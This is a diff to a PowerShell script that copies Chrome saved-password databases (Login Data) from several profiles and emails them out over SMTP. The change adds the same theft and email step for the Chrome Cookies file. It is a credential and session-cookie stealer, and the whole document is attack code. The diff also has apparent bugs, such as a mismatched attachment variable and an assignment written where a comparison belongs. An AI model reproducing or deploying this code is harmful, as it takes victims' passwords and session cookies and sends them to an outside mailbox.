@@ -10,7 +10,7 @@ $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 
-$path1=$path2=$path3=0
+$path1=$path2=$path3=$path4=0
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Login` Data)
 {
 	$chromeD="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
@@ -20,7 +20,7 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\
 	$Attachment1 = "D:\ChromeDataD"
 	
 }
-	
+
 
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
 {
@@ -33,13 +33,21 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile`
 
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 2\Login` Data)
 {
-	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 2\Login Data"
+	$chrome2="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 2\Login Data"
 	$path3=1
-	copy-item -path $chromeD -destination D:/
+	copy-item -path $chrome2 -destination D:/
 	Rename-Item D:\Login` Data ChromeDataP2
 	$Attachment3 = "D:\ChromeDataP2"
 }
 
+if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
+{
+	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+	$path4=1
+	copy-item -path $chrome3 -destination D:/
+	Rename-Item D:\Cookies ChromeDataP23
+	$Attachment3 = "D:\ChromeDataP23"
+}
 
 
 
@@ -66,6 +74,15 @@ Send-MailMessage -From $From -to $To -Subject $Subject `
 -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
 -Credential $credentials -Attachments $Attachment3
 Remove-Item D:\ChromeDataP2
+
+}
+
+if($path4=1)
+{
+Send-MailMessage -From $From -to $To -Subject $Subject `
+-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
+-Credential $credentials -Attachments $Attachment4
+Remove-Item D:\ChromeDataP23
 
 }
  
